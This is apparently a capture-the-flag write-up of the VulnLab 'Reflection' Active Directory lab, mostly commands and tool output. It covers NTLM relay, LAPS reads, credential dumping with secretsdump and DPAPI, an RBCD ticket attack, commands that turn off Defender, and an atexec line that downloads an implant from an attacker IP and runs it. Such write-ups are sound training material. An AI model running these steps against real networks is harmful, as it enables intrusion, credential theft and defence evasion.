---
title: VulnLab Reflection
description: VulnLab Reflection
image:
  path: reflection.png
categories:
- VulnLab Chains
- Active Directory
layout: post
media_subpath: /assets/posts/labs/vulnlab/chains/reflection
tags:
- vulnlab-chains
- active-directory
---
# Reflection

## Recon
```
10.10.226.101 -> [53,88,135,139,389,445,464,593,636,1433,3268,3269,3389,5985,9389]
10.10.226.102 -> [135,445,1433,3389,5985]
10.10.226.103 -> [135,445,3389,7680]
```
```
└─$ nmap -sC -sV -p53,88,135,139,389,445,464,593,636,1433,3268,3269,3389,5985,9389 10.10.226.101
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-16 00:48 +05
Nmap scan report for 10.10.226.101
Host is up (0.090s latency).

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-01-15 19:47:26Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: reflection.vl0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-ntlm-info: 
|   10.10.226.101:1433: 
|     Target_Name: REFLECTION
|     NetBIOS_Domain_Name: REFLECTION
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: reflection.vl
|     DNS_Computer_Name: dc01.reflection.vl
|     DNS_Tree_Name: reflection.vl
|_    Product_Version: 10.0.20348
| ms-sql-info: 
|   10.10.226.101:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2025-01-15T19:44:05
|_Not valid after:  2055-01-15T19:44:05
|_ssl-date: 2025-01-15T19:48:12+00:00; -1m20s from scanner time.
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: reflection.vl0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: REFLECTION
|   NetBIOS_Domain_Name: REFLECTION
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: reflection.vl
|   DNS_Computer_Name: dc01.reflection.vl
|   DNS_Tree_Name: reflection.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2025-01-15T19:47:32+00:00
| ssl-cert: Subject: commonName=dc01.reflection.vl
| Not valid before: 2025-01-14T19:41:08
|_Not valid after:  2025-07-16T19:41:08
|_ssl-date: 2025-01-15T19:48:12+00:00; -1m20s from scanner time.
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp open  mc-nmf        .NET Message Framing
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-01-15T19:47:36
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_clock-skew: mean: -1m20s, deviation: 0s, median: -1m20s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 55.56 seconds
```
```
└─$ nmap -sC -sV -p135,445,1433,3389,5985 10.10.226.102
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-16 00:50 +05
Nmap scan report for 10.10.226.102
Host is up (0.089s latency).

PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
445/tcp  open  microsoft-ds?
1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-info: 
|   10.10.226.102:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
|_ssl-date: 2025-01-15T19:49:45+00:00; -1m20s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2025-01-15T19:41:57
|_Not valid after:  2055-01-15T19:41:57
| ms-sql-ntlm-info: 
|   10.10.226.102:1433: 
|     Target_Name: REFLECTION
|     NetBIOS_Domain_Name: REFLECTION
|     NetBIOS_Computer_Name: MS01
|     DNS_Domain_Name: reflection.vl
|     DNS_Computer_Name: ms01.reflection.vl
|     DNS_Tree_Name: reflection.vl
|_    Product_Version: 10.0.20348
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=ms01.reflection.vl
| Not valid before: 2025-01-14T19:41:23
|_Not valid after:  2025-07-16T19:41:23
| rdp-ntlm-info: 
|   Target_Name: REFLECTION
|   NetBIOS_Domain_Name: REFLECTION
|   NetBIOS_Computer_Name: MS01
|   DNS_Domain_Name: reflection.vl
|   DNS_Computer_Name: ms01.reflection.vl
|   DNS_Tree_Name: reflection.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2025-01-15T19:49:05+00:00
|_ssl-date: 2025-01-15T19:49:45+00:00; -1m20s from scanner time.
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-01-15T19:49:07
|_  start_date: N/A
|_clock-skew: mean: -1m20s, deviation: 0s, median: -1m20s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 58.52 seconds
```
```
└─$ nmap -sC -sV -p135,445,3389,7680 10.10.226.103
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-16 00:51 +05
Nmap scan report for 10.10.226.103
Host is up (0.090s latency).

PORT     STATE    SERVICE       VERSION
135/tcp  open     msrpc         Microsoft Windows RPC
445/tcp  open     microsoft-ds?
3389/tcp open     ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: REFLECTION
|   NetBIOS_Domain_Name: REFLECTION
|   NetBIOS_Computer_Name: WS01
|   DNS_Domain_Name: reflection.vl
|   DNS_Computer_Name: ws01.reflection.vl
|   DNS_Tree_Name: reflection.vl
|   Product_Version: 10.0.19041
|_  System_Time: 2025-01-15T19:50:29+00:00
|_ssl-date: 2025-01-15T19:51:09+00:00; -1m20s from scanner time.
| ssl-cert: Subject: commonName=ws01.reflection.vl
| Not valid before: 2025-01-14T19:43:13
|_Not valid after:  2025-07-16T19:43:13
7680/tcp filtered pando-pub
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_clock-skew: mean: -1m20s, deviation: 0s, median: -1m20s
| smb2-time: 
|   date: 2025-01-15T19:50:30
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 53.56 seconds

```
## MS01.reflection.vl
Let's check if anonymous login is enabled
```
└─$ nxc smb targets.txt -u 'Guest' -p '' --shares
SMB         10.10.226.101   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:reflection.vl) (signing:False) (SMBv1:False)
SMB         10.10.226.103   445    WS01             [*] Windows 10 / Server 2019 Build 19041 x64 (name:WS01) (domain:reflection.vl) (signing:False) (SMBv1:False)
SMB         10.10.226.101   445    DC01             [-] reflection.vl\Guest: STATUS_ACCOUNT_DISABLED 
SMB         10.10.226.103   445    WS01             [-] reflection.vl\Guest: STATUS_ACCOUNT_DISABLED 
SMB         10.10.226.102   445    MS01             [*] Windows Server 2022 Build 20348 x64 (name:MS01) (domain:reflection.vl) (signing:False) (SMBv1:False)
SMB         10.10.226.102   445    MS01             [+] reflection.vl\Guest: 
SMB         10.10.226.102   445    MS01             [*] Enumerated shares
SMB         10.10.226.102   445    MS01             Share           Permissions     Remark
SMB         10.10.226.102   445    MS01             -----           -----------     ------
SMB         10.10.226.102   445    MS01             ADMIN$                          Remote Admin
SMB         10.10.226.102   445    MS01             C$                              Default share
SMB         10.10.226.102   445    MS01             IPC$            READ            Remote IPC
SMB         10.10.226.102   445    MS01             staging         READ            staging environment
Running nxc against 3 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00

```

It's enabled on MS01. There's `staging` which contains credentials
```
└─$ smbclient.py Guest:''@10.10.226.102               
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

Password:
Type help for list of commands
# use staging
# ls
drw-rw-rw-          0  Thu Jun  8 17:21:36 2023 .
drw-rw-rw-          0  Wed Jun  7 23:41:25 2023 ..
-rw-rw-rw-         50  Thu Jun  8 17:21:49 2023 staging_db.conf
# cat staging_db.conf
user=web_staging
password=<REDACTED>
db=staging
# 

```

Credentials are valid
```
└─$ nxc mssql 10.10.226.102 -u 'web_staging' -p '<REDACTED>' --local-auth
MSSQL       10.10.226.102   1433   MS01             [*] Windows Server 2022 Build 20348 (name:MS01) (domain:reflection.vl)
MSSQL       10.10.226.102   1433   MS01             [+] MS01\web_staging:<REDACTED>
```

We can check database, which has `staging` database with `users` table that contains creds, yet they don't work
```
└─$ mssqlclient.py web_staging:<REDACTED>@10.10.200.150                                      
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(MS01\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(MS01\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands
SQL (web_staging  guest@master)> enum_db
name      is_trustworthy_on   
-------   -----------------   
master                    0   

tempdb                    0   

model                     0   

msdb                      1   

staging                   0   

SQL (web_staging  guest@master)> use staging
ENVCHANGE(DATABASE): Old Value: master, New Value: staging
INFO(MS01\SQLEXPRESS): Line 1: Changed database context to 'staging'.
SQL (web_staging  dbo@staging)> Select name from sys.tables;
name    
-----   
users   

SQL (web_staging  dbo@staging)> select * from users;
id   username   password        
--   --------   -------------   
 1   b'dev01'   b'Initial123'   

 2   b'dev02'   b'Initial123'   

SQL (web_staging  dbo@staging)>
```

We can't execute. We can also try retrieving hash, but unfortunately it's not crackable
```
SQL (web_staging  dbo@staging)> xp_dirtree \\10.8.4.147\test
subdirectory   depth   file   
------------   -----   ----   
```
```
└─$ sudo responder -I tun0
<SNIP>
[SMB] NTLMv2-SSP Hash     : svc_web_staging::REFLECTION:f2c0bcc138c1aff1:F8B7C1CBE0160425CAA5D30719123F95:010100000000000000BA1A1F7168DB0170C214A86BB1B2870000000002000800530037004E004A0001001E00570049004E002D00360045003100390045004E005700360052004100320004003400570049004E002D00360045003100390045004E00570036005200410032002E00530037004E004A002E004C004F00430041004C0003001400530037004E004A002E004C004F00430041004C0005001400530037004E004A002E004C004F00430041004C000700080000BA1A1F7168DB01060004000200000008003000300000000000000000000000003000000EF520D614332B83B1EFC4A3C44DD1FFA643728B6DB750976B483A4A85973F6B0A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E0038002E0034002E003100340037000000000000000000                                                                                                                                                                                                                      

```

We can try relaying to hosts, since smb signing is disabled
```
└─$ ntlmrelayx.py -tf targets.txt -smb2support --no-http-server -i
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

<SNIP>
```
```
```

And we receive sessions
```
└─$ ntlmrelayx.py -tf targets.txt -smb2support --no-http-server -i

<SNIP>
[*] Started interactive SMB client shell via TCP on 127.0.0.1:11000
[]
[*] SMBD-Thread-4 (process_request_thread): Connection from REFLECTION/SVC_WEB_STAGING@10.10.200.150 controlled, attacking target smb://10.10.200.150
[-] Authenticating against smb://10.10.200.150 as REFLECTION/SVC_WEB_STAGING FAILED
[*] Received connection from REFLECTION/svc_web_staging at MS01, connection will be relayed after re-authentication
[ParseResult(scheme='smb', netloc='REFLECTION\\SVC_WEB_STAGING@10.10.200.150', path='', params='', query='', fragment='')]
[*] SMBD-Thread-6 (process_request_thread): Connection from REFLECTION/SVC_WEB_STAGING@10.10.200.150 controlled, attacking target smb://10.10.200.151
[*] Authenticating against smb://10.10.200.151 as REFLECTION/SVC_WEB_STAGING SUCCEED
[*] Started interactive SMB client shell via TCP on 127.0.0.1:11001
<SNIP>

```

DC01 has `prod` has shares with creds, but nothing on WS01
```
└─$ nc 127.0.0.1 11000                              
Type help for list of commands
# shares
ADMIN$
C$
IPC$
NETLOGON
prod
SYSVOL
# use prod
# ls
drw-rw-rw-          0  Wed Jun  7 23:44:26 2023 .
drw-rw-rw-          0  Wed Jun  7 23:43:22 2023 ..
-rw-rw-rw-         45  Thu Jun  8 17:24:39 2023 prod_db.conf
# cat prod_db.conf
user=web_prod
password=<REDACTED>
db=prod
# 
```
We can try authenticating against targets. Seems like we can login to MSSQL on DC01
```
┌──(kali㉿kali)-[~/vulnlab/chains/reflection]
└─$ nxc mssql targets.txt -u 'web_prod' -p '<REDACTED>' --local-auth
MSSQL       10.10.200.149   1433   DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:reflection.vl)
MSSQL       10.10.200.149   1433   DC01             [+] DC01\web_prod:<REDACTED> 
MSSQL       10.10.200.150   1433   MS01             [*] Windows Server 2022 Build 20348 (name:MS01) (domain:reflection.vl)
MSSQL       10.10.200.150   1433   MS01             [-] MS01\web_prod:<REDACTED> (Login failed for user 'web_prod'. Please try again with or without '--local-auth')
Running nxc against 3 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00

```
Let's check content. Database structure is identical to MS01's. New credentials acquired. We can't execute anything. We can also retrieve hash, but it's not crackable.
```
└─$ mssqlclient.py web_prod:'<REDACTED>'@10.10.200.149                      
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(DC01\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands
SQL (web_prod  guest@master)> enum_db
name     is_trustworthy_on   
------   -----------------   
master                   0   

tempdb                   0   

model                    0   

msdb                     1   

prod                     0   

SQL (web_prod  guest@master)> use prod
ENVCHANGE(DATABASE): Old Value: master, New Value: prod
INFO(DC01\SQLEXPRESS): Line 1: Changed database context to 'prod'.
SQL (web_prod  dbo@prod)> select name from sys.tables
name    
-----   
users   

SQL (web_prod  dbo@prod)> select * from users;
id   name              password            
--   ---------------   -----------------   
 1   b'abbie.smith'    b'<REDACTED>'   

 2   b'dorothy.rose'   b'<REDACTED>'
```
Both creds are valid
```
└─$ nxc smb 10.10.200.149 -u users.txt -p passwords.txt --continue-on-success --no-bruteforce
SMB         10.10.200.149   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:reflection.vl) (signing:False) (SMBv1:False)
SMB         10.10.200.149   445    DC01             [+] reflection.vl\abbie.smith:<REDACTED> 
SMB         10.10.200.149   445    DC01             [+] reflection.vl\dorothy.rose:<REDACTED>
```

Let's enumerate domain with bloodhound
```
└─$ bloodhound-python -d 'reflection.vl' -u 'abbie.smith' -p '<REDACTED>' -c all -ns 10.10.200.149  --zip
INFO: Found AD domain: reflection.vl
<SNIP>
```

Looks like `abbie.smith` has `GenericAll` over MS01

![](1.png)

We can try performing RBCD or Shadow Credentials attack. But we can't perform them, since MachineAccountQuota is 0 and there is not ADCS
```
└─$ nxc ldap 10.10.225.133 -u 'abbie.smith' -p '<REDACTED>' -M maq
LDAP        10.10.225.133   389    DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:reflection.vl)
LDAP        10.10.225.133   389    DC01             [+] reflection.vl\abbie.smith:<REDACTED> 
MAQ         10.10.225.133   389    DC01             [*] Getting the MachineAccountQuota
MAQ         10.10.225.133   389    DC01             MachineAccountQuota: 0

```

Another option is to check LAPS (bloodhound showed GPO), GenericAll gives rights to read attributes. Since LAPS password is in LDAP attributes, we can read it
```
└─$ nxc ldap 10.10.225.133 -u 'abbie.smith' -p '<REDACTED>' -M laps
LDAP        10.10.225.133   389    DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:reflection.vl)
LDAP        10.10.225.133   389    DC01             [+] reflection.vl\abbie.smith:<REDACTED> 
LAPS        10.10.225.133   389    DC01             [*] Getting LAPS Passwords
LAPS        10.10.225.133   389    DC01             Computer:MS01$ User:                Password:<REDACTED>
```

Now we have admin session on 
```
└─$ evil-winrm -i 10.10.225.134 -u Administrator -p '<REDACTED>'
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

## WS01.reflection.vl
After dumping creds from MS01, we have new creds for `svc_web_staging`
```
└─$ secretsdump.py ./administrator:'<REDACTED>'@10.10.225.134
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0xf0093534e5f21601f5f509571855eeee
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:<REDACTED>:::
<SNIP>
REFLECTION\MS01$:aad3b435b51404eeaad3b435b51404ee:<REDACTED>:::
[*] DPAPI_SYSTEM 
dpapi_machinekey:0xb7ad02ee5577322cc2a2e096b7bab17101a4f9a7
dpapi_userkey:0x9de553e3a73ece7cff322d722fc9fbdfe4fd78cc
[*] NL$KM 
 0000   C0 BE 31 EA 49 A4 51 79  67 62 D2 F1 C2 22 1C BE   ..1.I.Qygb..."..
 0010   CE 86 94 CF D5 32 5D 73  32 64 85 4C 37 81 7B AE   .....2]s2d.L7.{.
 0020   0C D1 61 83 A3 65 91 58  D6 F0 B3 17 47 5F 64 93   ..a..e.X....G_d.
 0030   A4 AC D7 4F E7 E4 A5 EE  E8 6D BE 93 7A CF 35 77   ...O.....m..z.5w
NL$KM:c0be31ea49a451796762d2f1c2221cbece8694cfd5325d733264854c37817bae0cd16183a3659158d6f0b317475f6493a4acd74fe7e4a5eee86dbe937acf3577
[*] _SC_MSSQL$SQLEXPRESS 
REFLECTION\svc_web_staging:<REDACTED>
[*] Cleaning up... 
[*] Stopping service RemoteRegistry
```

We notice `Georgia.Price` user in dump, which has `GenericAll` over WS01. Let's check if it's possible to get creds

![](2.png)

We can use `SharpDPAPI` to check if there are credentials in DPAPI and we successfully retrieve them

![](3.png)

![](4.png)

We can also use `nxc` to do it
```
└─$ nxc smb 10.10.225.134 -u Administrator -p '<REDACTED>' --dpapi --local-auth
SMB         10.10.225.134   445    MS01             [*] Windows Server 2022 Build 20348 x64 (name:MS01) (domain:MS01) (signing:False) (SMBv1:False)
SMB         10.10.225.134   445    MS01             [+] MS01\Administrator:<REDACTED> (Pwn3d!)
SMB         10.10.225.134   445    MS01             [*] Collecting DPAPI masterkeys, grab a coffee and be patient...
SMB         10.10.225.134   445    MS01             [+] Got 7 decrypted masterkeys. Looting secrets...
SMB         10.10.225.134   445    MS01             [SYSTEM][CREDENTIAL] Domain:batch=TaskScheduler:Task:{013CD3ED-72CB-4801-99D7-8E7CA1F7E370} - REFLECTION\Georgia.Price:<REDACTED>
<SNIP>
```

We can't add new computer, but we have a hash for MS01, so we can perform RBCD
```
└─$ rbcd.py -delegate-from 'ms01$' -delegate-to 'ws01$' -dc-ip 10.10.225.133 -action 'write' 'reflection.vl/Georgia.Price:<REDACTED>'
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
[*] Delegation rights modified successfully!
[*] ms01$ can now impersonate users on ws01$ via S4U2Proxy
[*] Accounts allowed to act on behalf of other identity:
[*]     MS01$        (S-1-5-21-3375389138-1770791787-1490854311-1104)
```
```
└─$ rbcd.py -delegate-to 'ws01$' -dc-ip 10.10.225.133 -action 'read' 'reflection.vl/Georgia.Price:<REDACTED>'       
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Accounts allowed to act on behalf of other identity:
[*]     MS01$        (S-1-5-21-3375389138-1770791787-1490854311-1104)
```

Let's get a ticket
```
└─$ getST.py -dc-ip 10.10.225.133 -spn www/ws01 'reflection.vl/ms01$' -impersonate administrator -hashes :<REDACTED>
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in administrator@www_ws01@REFLECTION.VL.ccache
```

Dump the secrets
```
└─$ KRB5CCNAME=administrator@cifs_ws01.reflection.vl@REFLECTION.VL.ccache secretsdump.py -k -no-pass ws01.reflection.vl
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Service RemoteRegistry is in stopped state
[*] Service RemoteRegistry is disabled, enabling it
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0x7ed33ac4a19a5ea7635d402e58c0055f
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:<REDACTED>:::
<SNIP>
REFLECTION\WS01$:aad3b435b51404eeaad3b435b51404ee:<REDACTED>:::
[*] DefaultPassword 
reflection.vl\Rhys.Garner:<REDACTED>
<SNIP>
[*] Cleaning up... 
[*] Stopping service RemoteRegistry
[*] Restoring the disabled state for service RemoteRegistry
```

To get shell we can disable defender or set exclusion path with `atexec.py`
```
Set-MPPreference -DisableRealTimeMonitoring $true
Set-MPPreference -DisableIOAVProtection $true
Set-MPPreference -DisableIntrusionPreventionSystem $true
Set-MpPreference -ExclusionPath C:\\
```
Or use evasive payload
```
└─$ atexec.py -hashes :<REDACTED> ./administrator@ws01.reflection.vl  'powershell.exe -c "iwr http://10.8.4.147:8000/demon.exe -outfile c:\windows\tasks\demon.exe;Start-process c:\windows\tasks\demon.exe"'
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[!] This will work ONLY on Windows >= Vista
[*] Creating task \ujGdRUCo
[*] Running task \ujGdRUCo
[*] Deleting task \ujGdRUCo
[*] Attempting to read ADMIN$\Temp\ujGdRUCo.tmp
[*] Attempting to read ADMIN$\Temp\ujGdRUCo.tmp

```

We get our system beacon

![](5.png)

## DC01.reflection.vl
When we dumped creds from DC01, we got `Rhys.Garner:<REDACTED>` creds. But there's also user `dom_rgarner`, who is Domain Admin. It's quite possible that this is the same user.

![](6.png)

Let's test if there's password reuse
```
└─$ nxc smb 10.10.225.133 -u 'dom_rgarner' -p '<REDACTED>'     
SMB         10.10.225.133   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:reflection.vl) (signing:False) (SMBv1:False)
SMB         10.10.225.133   445    DC01             [+] reflection.vl\dom_rgarner:<REDACTED> (Pwn3d!)
```

Dump the domain
```
└─$ secretsdump.py reflection.vl/dom_rgarner:'<REDACTED>'@10.10.225.133
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0xfcb176024780bc221b4c7b3f35e16dfd
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
<SNIP
[*] _SC_MSSQL$SQLEXPRESS 
REFLECTION\svc_web_prod:<REDACTED>
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:<REDACTED>:::
<SNIP>
```

[https://api.vulnlab.com/api/v1/share?id=73e64769-1783-46dc-a7f3-0fb64989231c](https://api.vulnlab.com/api/v1/share?id=73e64769-1783-46dc-a7f3-0fb64989231c)